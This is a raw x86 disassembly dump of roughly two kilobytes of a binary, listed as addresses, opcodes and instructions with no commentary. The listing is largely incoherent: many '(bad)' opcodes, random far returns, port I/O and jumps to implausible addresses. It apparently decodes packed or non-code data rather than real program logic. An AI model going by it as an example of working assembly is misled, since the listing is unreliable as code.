  41809e:	cmp    DWORD PTR [eax-0x7a87af0],0x46
  4180a5:	inc    ebp
  4180a6:	add    BYTE PTR [esi],bh
  4180a8:	push   0x8b809c
  4180ad:	in     al,dx
  4180ae:	inc    ebp
  4180af:	push   ebp
  4180b0:	mov    esi,DWORD PTR [ebx]
  4180b2:	cld    
  4180b3:	add    eax,DWORD PTR [eax+0xf013b]
  4180b9:	adc    al,0x0
  4180bb:	add    bh,bh
  4180bd:	jmp    0xbe81da
  4180c2:	add    BYTE PTR [ebp+0x45],cl
  4180c5:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  4180cb:	dec    ebp
  4180cc:	push   0x38033
  4180d1:	cmp    eax,DWORD PTR [eax]
  4180d3:	unpcklps xmm7,xmm0
  4180d6:	jne    0x4180d8
  4180d8:	dec    DWORD PTR [ebx+0x5545cc18]
  4180de:	mov    DWORD PTR [ebx],esi
  4180e0:	shl    BYTE PTR [ebx],1
  4180e2:	inc    ebp
  4180e3:	add    ecx,DWORD PTR [ecx+0x60fc803]
  4180e9:	retf   0x5575
  4180ec:	dec    DWORD PTR [ebx-0x5ba17e8]
  4180f2:	(bad)  
  4180f3:	stc    
  4180f4:	in     al,dx
  4180f5:	or     al,0x85
  4180f7:	dec    ebp
  4180f8:	clc    
  4180f9:	xor    eax,DWORD PTR [ebp+0x3]
  4180fc:	mov    ebp,ecx
  4180fe:	rol    BYTE PTR [eax],1
  418100:	inc    ebp
  418101:	add    BYTE PTR [eax-0x7747ab3],bh
  418107:	clc    
  418108:	inc    ebp
  418109:	retf   
  41810a:	mov    edx,ebx
  41810c:	in     al,dx
  41810d:	(bad)  
  41810e:	retf   
  41810f:	into   
  418110:	into   
  418111:	scas   eax,DWORD PTR es:[edi]
  418112:	dec    ebp
  418113:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  418119:	sub    ecx,esi
  41811b:	cmp    ecx,DWORD PTR [ebp+0x77]
  41811e:	(bad)  
  41811f:	mov    edi,eax
  418121:	int3   
  418122:	test   DWORD PTR [ecx-0x74baff08],ecx
  418128:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  41812f:	xor    eax,DWORD PTR [ebp+0x4503f803]
  418135:	(bad)  
  418137:	retf   0x559c
  41813a:	(bad)  
  41813b:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  418142:	inc    ebp
  418143:	add    eax,0xeb9c4d3f
  418148:	(bad)  
  418149:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  41814f:	xor    ecx,DWORD PTR [ebp+0x33]
  418152:	mov    eax,DWORD PTR [ebx]
  418154:	call   0xce514c5c
  418159:	retf   0x55d1
  41815c:	test   BYTE PTR [ebx-0x5ff17fe],cl
  418162:	jmp    0x41815d
  418164:	add    BYTE PTR ds:0xebf44d8b,al
  41816a:	push   ebp
  41816b:	mov    ebp,DWORD PTR [ebx]
  41816d:	mov    eax,0x33f8558b
  418172:	retf   
  418173:	xor    ecx,esi
  418175:	add    edx,ecx
  418177:	add    eax,DWORD PTR [edx+0xca010f]
  41817d:	push   ebp
  41817e:	dec    ebp
  41817f:	mov    ecx,DWORD PTR [ebx-0x34050718]
  418185:	stc    
  418186:	rol    DWORD PTR ds:0xebce4dd6,cl
  41818c:	scas   eax,DWORD PTR es:[edi]
  41818d:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  418193:	xor    ebp,DWORD PTR [ebx]
  418195:	xor    edi,DWORD PTR [ebx]
  418197:	add    esi,DWORD PTR [edi+0x3]
  41819a:	mov    ecx,DWORD PTR [edi]
  41819c:	clc    
  41819d:	retf   0x55cb
  4181a0:	into   
  4181a1:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  4181a8:	test   al,0x4d
  4181aa:	push   ebp
  4181ab:	jbe    0x4181e0
  4181ad:	mov    esi,DWORD PTR [ebx]
  4181af:	mov    al,0x3
  4181b1:	push   ebp
  4181b2:	add    esi,DWORD PTR [ebx]
  4181b4:	rdpmc  
  4181b6:	retf   0x5503
  4181b9:	add    ecx,DWORD PTR [ebx-0x53517f1]
  4181bf:	dec    ebp
  4181c0:	stc    
  4181c1:	mov    ecx,DWORD PTR [eax]
  4181c3:	or     BYTE PTR [ebp+0x4d],cl
  4181c6:	jmp    0x1358256
  4181cb:	dec    ebp
  4181cc:	dec    ebp
  4181cd:	(bad)  
  4181ce:	mov    ebx,esp
  4181d0:	clc    
  4181d1:	test   ebx,ecx
  4181d3:	clc    
  4181d4:	ror    DWORD PTR [ebp-0x2a],cl
  4181d7:	mov    esi,ecx
  4181d9:	lock scas eax,DWORD PTR es:[edi]
  4181db:	inc    ebp
  4181dc:	mov    esi,DWORD PTR [ebx]
  4181de:	hlt    
  4181df:	pushf  
  4181e0:	jge    0x41816d
  4181e2:	sub    ebx,esp
  4181e4:	cmp    ecx,ebx
  4181e6:	ja     0x4181b6
  4181e8:	mov    ebp,DWORD PTR [eax-0x58]
  4181eb:	dec    ebp
  4181ec:	xor    ecx,DWORD PTR [di+0x3]
  4181f0:	mov    esp,esp
  4181f2:	clc    
  4181f3:	push   ebp
  4181f4:	retf   
  4181f5:	mov    dl,bl
  4181f7:	adc    esi,edx
  4181f9:	jb     0x4181c9
  4181fb:	add    BYTE PTR [edi-0xb7474b3],ch
  418201:	lock jge 0x4181cf
  418204:	sub    ecx,DWORD PTR [ebp+0x3b]
  418207:	mov    esi,DWORD PTR [edi-0x20]
  41820a:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459c]
  418211:	mov    BYTE PTR [ebx-0x34b20729],cl
  418217:	mov    edx,ebx
  418219:	lock (bad) 
  41821b:	ror    esi,cl
  41821d:	push   ebp
  41821e:	scas   eax,DWORD PTR es:[edi]
  41821f:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  418225:	pushf  
  418226:	sub    esi,DWORD PTR [edx]
  418228:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  41822e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41822f:	xor    esp,DWORD PTR [ebx]
  418231:	add    ecx,DWORD PTR [ebp-0x1c]
  418234:	mov    edi,DWORD PTR [ebp-0x8]
  418237:	mov    bl,cl
  418239:	cmp    dl,bl
  41823b:	jb     0x41820b
  41823d:	add    dh,dl
  41823f:	dec    ebp
  418240:	scas   eax,DWORD PTR es:[edi]
  418241:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  418247:	shr    DWORD PTR [ebx],cl
  418249:	into   
  41824a:	cmp    edx,esi
  41824c:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  418252:	dec    ebp
  418253:	dec    ebp
  418254:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  41825a:	retf   
  41825b:	xor    edx,esi
  41825d:	add    ecx,esi
  41825f:	imul   ecx,edx
  418262:	mov    DWORD PTR [ebp+0x8],edx
  418265:	xor    ecx,DWORD PTR [ebp+0x2b]
  418268:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  41826e:	add    esi,DWORD PTR [ebx]
  418270:	rol    BYTE PTR [ebx],0x45
  418273:	rdtsc  
  418275:	xlat   BYTE PTR ds:[ebx]
  418276:	pushf  
  418277:	jge    0x418202
  418279:	xor    esp,eax
  41827b:	sub    eax,DWORD PTR [ebp-0x73]
  41827e:	(bad)  
  41827f:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  418286:	dec    ebp
  418287:	xchg   BYTE PTR [ebx],dh
  418289:	inc    DWORD PTR [ebx]
  41828b:	(bad)  
  41828c:	jmp    0x4182db
  41828e:	mov    ecx,DWORD PTR [ebx-0x34341324]
  418294:	dec    ebp
  418295:	into   
  418296:	mov    ebp,DWORD PTR [edi-0x23737420]
  41829c:	pushf  
  41829d:	shl    DWORD PTR [edx],cl
  41829f:	retf   0x5588
  4182a2:	or     ecx,DWORD PTR [ebp+0x7233114d]
  4182a8:	add    eax,DWORD PTR [eax]
  4182aa:	in     al,0x4d
  4182ac:	push   ebp
  4182ad:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  4182b3:	fs add ch,cl
  4182b6:	dec    ebp
  4182b7:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  4182bd:	dec    ebp
  4182be:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  4182c4:	jge    0x418294
  4182c6:	mov    BYTE PTR [edi+0xf723b3a],ch
  4182cc:	add    cl,dh
  4182ce:	dec    ebp
  4182cf:	dec    DWORD PTR [ebx-0x2c032301]
  4182d5:	inc    ebp
  4182d6:	push   ebp
  4182d7:	dec    DWORD PTR [ebx-0x73ff1f34]
  4182dd:	lea    ebx,[esp+edx*2+0x508bff32]
  4182e4:	mov    ah,0x45
  4182e6:	push   ebp
  4182e7:	mov    esi,DWORD PTR [ebx]
  4182e9:	les    esi,FWORD PTR [ebx]
  4182eb:	add    BYTE PTR [ebx],al
  4182ed:	inc    DWORD PTR [ebx]
  4182ef:	mov    ecx,DWORD PTR [edi]
  4182f1:	cld    
  4182f2:	retf   0x4d80
  4182f5:	add    DWORD PTR [ecx+0x4d30e400],ecx
  4182fb:	jne    0x418288
  4182fd:	(bad)  
  4182fe:	in     al,dx
  4182ff:	ror    bl,1
  418301:	scas   al,BYTE PTR es:[edi]
  418302:	into   
  418303:	add    BYTE PTR [edi-0xf2f7475],ch
  418309:	not    bl
  41830b:	adc    al,0xca
  41830d:	inc    ebp
  41830e:	push   ebp
  41830f:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  418315:	push   0xaf80d6
  41831a:	mov    eax,DWORD PTR [eax]
  41831c:	fdiv   st(7),st
  41831e:	sti    
  41831f:	sbb    dh,cl
  418321:	pop    esi
  418322:	xchg   esp,eax
  418323:	leave  
  418324:	pushf  
  418325:	add    al,0x32
  418327:	push   ebp
  418328:	cmp    ebp,esp
  41832a:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  41832e:	dec    DWORD PTR [ecx-0x740f0375]
  418334:	push   ebp
  418335:	cld    
  418336:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  41833c:	retf   0x558b
  41833f:	clc    
  418340:	xor    esi,eax
  418342:	add    esi,DWORD PTR [ebp-0x75]
  418345:	(bad)  
  418346:	hlt    
  418347:	or     cl,BYTE PTR [esi+eax*8-0x39cdf764]
  41834e:	mov    DWORD PTR [edx],ecx
  418350:	hlt    
  418351:	(bad)  
  418352:	dec    ebp
  418353:	add    dh,BYTE PTR [ebx]
  418355:	leave  
  418356:	mov    edx,0xffec8d55
  41835b:	push   ecx
  41835c:	rol    DWORD PTR [ebp+0x55],1
  41835f:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  418365:	mov    eax,0xf8030b33
  41836a:	lar    ecx,di
  41836d:	push   ebp
  41836e:	retf   0x863b
  418371:	jne    0x418370
  418373:	mov    edi,edi
  418375:	or     BYTE PTR [ebp+0x41],dh
  418378:	mov    ebp,esp
  41837a:	cld    
  41837b:	inc    eax
  41837c:	mov    al,0x25
  41837e:	add    DWORD PTR [ecx+0x0],eax
  418381:	in     eax,dx
  418382:	test   DWORD PTR [ecx-0x1],eax
  418385:	fdiv   st(7),st
  418387:	ret    0x8b
  41838a:	cld    
  41838b:	mov    eax,DWORD PTR [eax+0x8d0151]
  418391:	clc    
  418392:	xor    BYTE PTR [ebp+0x45],al
  418395:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  41839b:	loopne 0x41839c
  41839d:	mov    edi,edi
  41839f:	mov    ecx,eax
  4183a1:	clc    
  4183a2:	jne    0x418374
  4183a4:	call   0x8294ad
  4183a9:	and    eax,0xc6854575
  4183ae:	je     0x4183b1
  4183b0:	mov    eax,esi
  4183b2:	cld    
  4183b3:	or     DWORD PTR [eax+0x401c9],eax
  4183b9:	push   ebp
  4183ba:	add    ah,ch
  4183bc:	add    BYTE PTR [ecx+0x6a],dl
  4183bf:	inc    ebp
  4183c0:	push   esi
  4183c1:	mov    DWORD PTR [eax-0x4],edx
  4183c4:	pop    edi
  4183c5:	mov    ebx,DWORD PTR [ebx-0x4]
  4183c8:	ret    0xbe
  4183cb:	push   es
  4183cc:	mov    ecx,DWORD PTR [ecx-0x77274af]
  4183d2:	clc    
  4183d3:	lock inc ebp
  4183d5:	jne    0x41842d
  4183d7:	(bad)  
  4183d8:	jne    0x4183de
  4183da:	mov    eax,0xf841ba66
  4183df:	fadd   QWORD PTR [esi]
  4183e1:	(bad)  
  4183e2:	jne    0x418421
  4183e4:	cmp    eax,ebx
  4183e6:	pop    esi
  4183e7:	mov    ecx,DWORD PTR [eax]
  4183e9:	push   ecx
  4183ea:	inc    ecx
  4183eb:	lea    esi,[eax-0x8]
  4183ee:	inc    edx
  4183ef:	inc    ebp
  4183f0:	int    0x8b
  4183f2:	inc    edx
  4183f3:	cld    
  4183f4:	jo     0x4183b5
  4183f6:	inc    ecx
  4183f7:	xchg   edx,esp
  4183f9:	mov    ebx,eax
  4183fb:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  418401:	or     edi,eax
  418403:	inc    ebp
  418404:	inc    ebp
  418405:	(bad)  
  418406:	mov    ecx,DWORD PTR [eax]
  418408:	cld    
  418409:	(bad)  
  41840a:	jmp    0x41840d
  41840c:	mov    eax,esi
  41840e:	mov    DWORD PTR ds:0x4f8c98b,eax
  418414:	rcl    BYTE PTR [esi+0xf],1
  418417:	iret   
  418418:	inc    ebp
  418419:	leave  
  41841a:	(bad)  
  41841b:	dec    DWORD PTR [ecx]
  41841d:	mov    eax,esi
  41841f:	mov    eax,DWORD PTR [edi]
  418421:	mov    dh,0xdd
  418424:	push   es
  418425:	nop
  418426:	(bad)  
  418427:	inc    DWORD PTR [ebx]
  418429:	push   esi
  41842a:	leave  
  41842b:	iret   
  41842c:	add    al,0x46
  41842e:	push   ebp
  41842f:	jmp    0xff92da20
  418434:	inc    ebp
  418435:	push   esi
  418436:	mov    DWORD PTR [esi-0x4],eax
  418439:	in     eax,dx
  41843a:	push   ebp
  41843b:	sbb    BYTE PTR [eax+0x7c6daff],bh
  418441:	add    al,BYTE PTR [edx]
  418443:	mov    edx,DWORD PTR [ebp-0x17]
  418446:	cmp    edi,esi
  418448:	jne    0x418449
  41844a:	(bad)  
  41844b:	push   esi
  41844c:	pop    es
  41844d:	push   ebp
  41844e:	mov    ebp,esp
  418450:	or     BYTE PTR [ebp+0x41],al
  418453:	add    edi,esp
  418455:	sub    BYTE PTR [eax-0x4],al
  418458:	int3   
  418459:	jne    0x41841d
  41845b:	add    DWORD PTR [eax],eax
  41845d:	sbb    al,0x8b
  41845f:	mov    edx,DWORD PTR [ecx+0x14]
  418462:	lea    edx,[edx-0x1ba7508]
  418468:	push   esi
  418469:	enter  0xd375,0xb8
  41846d:	test   DWORD PTR [esi],0x6ce0750
  418473:	enter  0xd375,0x3b
  418477:	neg    DWORD PTR [esi+0x50]
  41847a:	or     cl,dl
  41847c:	inc    edx
  41847d:	(bad)  
  41847e:	loope  0x41846c
  418480:	(bad)  
  418481:	sub    eax,DWORD PTR [ebx]
  418483:	inc    eax
  418484:	loope  0x4184d6
  418486:	add    dl,BYTE PTR [eax-0x37]
  418489:	push   edi
  41848a:	push   ebp
  41848b:	imul   ah
  41848d:	adc    DWORD PTR [ecx-0x1],0x45
  418491:	add    BYTE PTR [ecx+0x55d3fc00],cl
  418497:	lea    edi,[eax-0x7fff4ca]
  41849d:	mov    eax,0x4550402
  4184a2:	cmp    ebp,ecx
  4184a4:	jne    0x418451
  4184a6:	mov    eax,DWORD PTR ds:0x241e808
  4184ac:	in     eax,dx
  4184ad:	add    BYTE PTR [eax-0x7],al
  4184b0:	out    0x36,eax
  4184b2:	inc    ecx
  4184b3:	aas    
  4184b4:	jmp    0xcd4736
  4184b9:	lock mov edi,DWORD PTR [ebp-0x18]
  4184bd:	and    edi,edi
  4184bf:	mov    edi,edi
  4184c1:	call   0xe40f859d
  4184c6:	push   es
  4184c7:	add    al,ch
  4184c9:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  4184d0:	(bad)  
  4184d1:	hlt    
  4184d2:	add    eax,0xffd3e87d
  4184d7:	cmp    bh,0x8
  4184da:	(bad)  
  4184db:	fld    DWORD PTR [esi]
  4184dd:	out    dx,al
  4184de:	call   0xffa083e6
  4184e3:	cmp    al,0x46
  4184e5:	shl    edx,0x8
  4184e8:	(bad)  
  4184e9:	pop    es
  4184ea:	fisttp QWORD PTR [ebp+0xe577eff]
  4184f0:	push   ebx
  4184f1:	add    BYTE PTR [ebx+0x24008b56],cl
  4184f7:	add    BYTE PTR [ebp+0x50],al
  4184fa:	push   eax
  4184fb:	add    DWORD PTR [ebx+0x757d1834],ecx
  418501:	sub    edx,DWORD PTR [esi-0x24]
  418504:	jne    0x4184bc
  418506:	lods   eax,DWORD PTR ds:[esi]
  418507:	mov    edx,DWORD PTR [edx-0x34]
  41850a:	dec    esi
  41850b:	out    0x83,eax
  41850d:	into   
  41850e:	push   edi
  418510:	loopne 0x4184e0
  418512:	shr    BYTE PTR [edx+ecx*4+0x0],1
  418516:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  41851d:	rol    DWORD PTR [edx],0x8
  418520:	mov    esp,ecx
  418522:	cmp    DWORD PTR [ebx],0xc
  418525:	mov    esi,0x5001c0
  41852a:	push   eax
  41852b:	push   cs
  41852c:	push   eax
  41852d:	(bad)  
  41852e:	sub    edx,edi
  418530:	push   esi
  418531:	adc    al,0xcb
  418533:	ins    DWORD PTR es:[edi],dx
  418534:	mov    eax,0x203e8
  418539:	add    al,ah
  41853b:	inc    esi
  41853c:	mov    al,ch
  41853e:	pop    es
  41853f:	add    DWORD PTR [eax],0x1
  418542:	add    dh,al
  418544:	add    ah,ch
  418546:	rol    DWORD PTR [edx-0xd],1
  418549:	cli    
  41854a:	push   0x4a
  41854c:	pop    ecx
  41854d:	retf   0xfe6
  418550:	add    BYTE PTR [ebx-0x4e72f41e],al
  418556:	(bad)  
  418557:	dec    BYTE PTR [ebx+0x45b1fc72]
  41855d:	(bad)  
  41855e:	sub    ebp,DWORD PTR [ebx]
  418560:	and    al,0x52
  418562:	(bad)  
  418563:	dec    edi
  418564:	inc    ebp
  418565:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  41856c:	add    BYTE PTR [ebp-0x7b],dh
  41856f:	pop    eax
  418570:	add    BYTE PTR [edx+0x0],bl
  418573:	pop    edx
  418574:	dec    ebp
  418575:	jmp    DWORD PTR [ebx]
  418577:	and    al,0xec
  418579:	push   edx
  41857a:	out    0x64,eax
  41857c:	jmp    0xd3f37b81
  418581:	jmp    0x4185db
  418583:	mov    al,0xfe
  418585:	dec    BYTE PTR [ebp-0x18fd8018]
  41858b:	add    BYTE PTR [esi+ebp*1],bh
  41858e:	pop    edx
  41858f:	icebp  
  418590:	mov    eax,cs
  418592:	ins    BYTE PTR es:[edi],dx
  418593:	adc    eax,0x75510000
  418598:	mov    esi,0x70158
  41859d:	or     DWORD PTR [eax-0x74f48dfe],esi
  4185a3:	mov    edi,esp
  4185a5:	cld    
  4185a6:	jge    0x41861d
  4185a8:	(bad)  
  4185aa:	aas    
  4185ab:	and    al,0x6d
  4185ad:	adc    cl,0x1
  4185b0:	mov    eax,DWORD PTR [eax]
  4185b2:	and    ecx,DWORD PTR [ebx-0x167203fd]
  4185b8:	dec    ebp
  4185b9:	add    eax,ebp
  4185bb:	add    BYTE PTR [edx],al
  4185bd:	fadd   DWORD PTR [eax]
  4185bf:	stc    
  4185c0:	enter  0xee00,0x8b
  4185c4:	sbb    eax,0x1
  4185c7:	sbb    esi,ecx
  4185c9:	in     al,0x0
  4185cb:	in     eax,dx
  4185cc:	add    BYTE PTR [eax],al
  4185ce:	jne    0x41855b
  4185d0:	cmp    edx,esp
  4185d2:	jb     0x4185dd
  4185d4:	jmp    0x41864b
  4185d6:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  4185dc:	add    BYTE PTR [ebx+0x4d83d840],cl
  4185e2:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  4185e8:	jb     0x418573
  4185ea:	pop    edx
  4185eb:	fadd   QWORD PTR [ebx-0x7445faa1]
  4185f1:	or     dh,BYTE PTR [edx+0x0]
  4185f4:	inc    edx
  4185f5:	or     dl,bh
  4185f7:	xlat   BYTE PTR ds:[ebx]
  4185f8:	dec    edx
  4185f9:	push   edi
  4185fa:	add    al,0x7
  4185fc:	leave  
  4185fd:	rol    DWORD PTR [edx+eax*1],0x7
  418601:	add    ecx,ecx
  418603:	mov    edx,ecx
  418605:	int3   
  418606:	jmp    0x4185c6
  418608:	mov    al,0x0
  41860a:	(bad)  
  41860b:	jne    0x4185f5
  41860d:	mov    eax,DWORD PTR [edx]
  41860f:	call   0xc1560314
  418614:	pop    edi
  418615:	add    ebx,DWORD PTR [ecx-0x37]
  418618:	pop    ecx
  418619:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  418620:	push   es
  418621:	mov    eax,DWORD PTR [eax]
  418623:	int3   
  418624:	add    ch,al
  418626:	jae    0x418610
  418628:	int    0x1
  41862a:	enter  0x3000,0x18
  41862e:	add    BYTE PTR [ebp+0x75],al
  418631:	mov    esi,DWORD PTR [eax-0x171f0134]
  418637:	push   0x2
  418639:	pop    ecx
  41863a:	add    BYTE PTR [eax],cl
  41863c:	push   ebx
  41863d:	lea    edi,[edi+eax*2]
  418640:	mov    al,0x1
  418642:	jb     0x418644
  418644:	mov    al,0x10
  418646:	push   eax
  418647:	add    al,0x75
  418649:	add    BYTE PTR [ebx],ch
  41864b:	add    ebx,esp
  41864d:	int3   
  41864e:	jne    0x418660
  418650:	movsx  edx,cl
  418653:	add    DWORD PTR [eax],eax
  418655:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  41865c:	mov    gs,edi
  41865e:	add    BYTE PTR [eax-0x50],ch
  418661:	add    al,ch
  418663:	mov    eax,DWORD PTR [ecx]
  418665:	sub    eax,DWORD PTR [eax]
  418667:	jb     0x4186de
  418669:	add    DWORD PTR [esp+eiz*8-0x50],esi
  41866d:	jge    0x418657
  41866f:	add    al,0x1
  418671:	add    DWORD PTR [eax],0x0
  418674:	jne    0x418676
  418676:	je     0x4186bd
  418678:	mov    eax,DWORD PTR [edi]
  41867a:	ror    BYTE PTR [ebp+0x4d],1
  41867d:	or     DWORD PTR [ecx+0x4d03d004],0x3
  418684:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  41868a:	mov    DWORD PTR [ebx],ebp
  41868c:	fadd   DWORD PTR [eax+0x75]
  41868f:	inc    eax
  418690:	pop    eax
  418691:	lea    ebx,[ecx+0x4f]
  418694:	push   0xb1000003
  418699:	out    dx,eax
  41869a:	add    ebp,DWORD PTR [edx+edx*2]
  41869d:	add    BYTE PTR [ebx+ecx*4],bh
  4186a0:	mov    ch,BYTE PTR [ebx]
  4186a2:	jb     0x418716
  4186a4:	add    al,0x89
  4186a6:	push   eax
  4186a7:	call   0x8429d419
  4186ac:	add    DWORD PTR [eax+eax*1],eax
  4186af:	jae    0x4186c5
  4186b1:	icebp  
  4186b2:	inc    ebp
  4186b3:	mov    eax,DWORD PTR gs:[ecx]
  4186b6:	int3   
  4186b7:	out    dx,al
  4186b8:	loopne 0x418707
  4186ba:	sub    eax,DWORD PTR [edx]
  4186bc:	push   0xffffff83
  4186be:	pop    esi
  4186bf:	push   cs
  4186c0:	jl     0x4186db
  4186c2:	add    al,0xaf
  4186c4:	xor    eax,0x832b6d00
  4186c9:	mov    eax,DWORD PTR [edx]
  4186cb:	rcr    BYTE PTR [ebp+0x754500dc],cl
  4186d1:	ror    DWORD PTR [ebx+0x7dc8e803],1
  4186d7:	inc    ebp
  4186d8:	shr    ebx,0x3
  4186db:	or     DWORD PTR [eax],0x4
  4186de:	push   0xffffffa5
  4186e0:	pop    esi
  4186e1:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  4186e8:	jmp    0x418747
  4186ea:	mov    edi,0xff0272
  4186ef:	fdivr  QWORD PTR [ebp+0x5d]
  4186f2:	push   0x4e
  4186f4:	pop    ecx
  4186f5:	call   0x41cafa
  4186fa:	mov    DWORD PTR [ebx],eax
  4186fc:	in     al,0xc8
  4186fe:	rol    BYTE PTR [ebp-0x75],0xc1
  418702:	call   0xab88e3
  418707:	pop    esi
  418708:	enter  0xceff,0x8b
  41870c:	repz mov ecx,DWORD PTR [ebp-0x34]
  418710:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  418717:	je     0x418719
  418719:	or     DWORD PTR [ebx-0x74183b24],eax
  41871f:	jne    0x418705
  418721:	jmp    0x41871c
  418723:	push   DWORD PTR [edx-0x24]
  418726:	push   0x4d
  418728:	pop    ecx
  418729:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  41872d:	jge    0x418735
  41872f:	mov    eax,eax
  418731:	sub    ebp,DWORD PTR [edx+0x24]
  418734:	pop    esi
  418735:	inc    ebp
  418736:	mov    esp,0x8b6077
  41873b:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  418741:	lods   al,BYTE PTR ds:[esi]
  418742:	add    BYTE PTR [ebx],bh
  418744:	enter  0xce73,0x49
  418748:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  418750:	stc    
  418751:	jge    0x4187c5
  418753:	jnp    0xdd410ab4
  418759:	call   0xc4882f
  41875e:	fadd   st(0),st
  418760:	dec    esi
  418761:	ins    BYTE PTR es:[edi],dx
  418762:	stc    
  418763:	cmp    al,0x73
  418765:	push   ebp
  418766:	mov    eax,0xf8028b
  41876b:	jne    0x41872e
  41876d:	mov    esi,ecx
  41876f:	mov    esp,DWORD PTR [ebp+0x2c]
  418772:	add    edi,DWORD PTR [ebp-0x24]
  418775:	sub    esp,eax
  418777:	and    al,0x45
  418779:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  41877f:	sbb    al,0xee
  418781:	pop    esi
  418782:	call   0x8187b2
  418787:	fsubr  st,st(3)
  418789:	sti    
  41878a:	add    BYTE PTR gs:[ecx],bh
  41878d:	add    eax,esp
  41878f:	add    DWORD PTR [esi],eax
  418791:	rol    DWORD PTR [ebp+0x8],0x29
  418795:	mov    esp,eax
  418797:	clc    
  418798:	jne    0x41880f
  41879a:	mov    eax,0x8b0673
  41879f:	loopne 0x4187e6
  4187a1:	loopne 0x41872c
  4187a3:	lods   al,BYTE PTR ds:[esi]
  4187a4:	int3   
  4187a5:	inc    ebp
  4187a6:	mov    DWORD PTR gs:[eax+edi*8],eax
  4187aa:	add    al,0xc3
  4187ac:	sub    ecx,DWORD PTR [ebp+0x47]
  4187af:	(bad)  
  4187b1:	shr    BYTE PTR [ebp-0x1f],0xe8
  4187b5:	add    eax,DWORD PTR [eax]
  4187b7:	call   0x64348bc
  4187bc:	add    esi,DWORD PTR [esi-0x3b2efc83]
  4187c2:	dec    esi
  4187c3:	ins    DWORD PTR es:[edi],dx
  4187c4:	in     al,dx
  4187c5:	lea    eax,[eax]
  4187c7:	inc    ebp
  4187c8:	inc    ebp
  4187c9:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  4187cf:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  4187d9:	and    al,0xdc
  4187db:	ror    DWORD PTR [edx+0x24],0xf7
  4187df:	or     BYTE PTR [ebp+0x4c],dh
  4187e2:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  4187e6:	stos   BYTE PTR es:[edi],al
  4187e7:	adc    edx,edi
  4187e9:	inc    esp
  4187ea:	add    edi,DWORD PTR [eax]
  4187ec:	jne    0x4187d1
  4187ee:	mov    DWORD PTR [eax-0x7449db04],ecx
  4187f4:	cmp    ecx,DWORD PTR [edi]
  4187f6:	sub    BYTE PTR [ebp-0x7e],dl
  4187f9:	sar    ebp,0xb
  4187fc:	jmp    FWORD PTR [edi+0x2400392a]
  418802:	sub    esi,DWORD PTR [ebx-0x73]
  418805:	mov    esp,DWORD PTR [ecx+edi*4]
  418808:	mov    ecx,DWORD PTR [eax]
  41880a:	and    BYTE PTR [eax],al
  41880c:	jne    0x4187d8
  41880e:	sub    ebp,ecx
  418810:	sbb    BYTE PTR [esi+0x32],ah
  418813:	dec    ebp
  418814:	push   ebp
  418815:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  41881b:	ret    
  41881c:	mov    edx,ebp
  41881e:	leave  
  41881f:	sub    DWORD PTR [esi+0x24],ebx
  418822:	ret    0x2b
  418825:	pop    ax
  418827:	push   ebp
  418828:	rol    BYTE PTR [ebx],0xeb
  41882b:	add    DWORD PTR [ecx+0x6c0001],0x40
  418832:	jb     0x418889
  418834:	ret    
  418835:	in     al,dx
  418836:	jecxz  0x4187c3
  418838:	push   esi
  418839:	xchg   esp,eax
  41883a:	jne    0x41883c
  41883c:	cmp    edx,DWORD PTR [esi+0x1c]
  41883f:	jne    0x418825
  418841:	mov    eax,DWORD PTR [ebp-0x77]
  418844:	ror    DWORD PTR [ebx+0x899408],0xe0
  41884b:	mov    esi,DWORD PTR [ebp-0x75]
  41884e:	pop    esi
  41884f:	nop
  418850:	mov    eax,DWORD PTR [eax]
  418852:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  418858:	add    al,0x0
  41885a:	inc    ebp
  41885b:	mov    eax,DWORD PTR [ebx]
  41885d:	mov    ebp,ebx
  41885f:	cmp    al,0xf
  418861:	or     al,al
  418863:	inc    ebp
  418864:	inc    ebp
  418865:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  41886b:	cld    
  41886c:	add    BYTE PTR [edi+0x556c16c0],dh
  418872:	add    BYTE PTR [ecx-0x5],dl
  418875:	add    eax,0x17200
  41887a:	sbb    al,0x85
  41887c:	dec    esp
  41887d:	je     0x4188b7
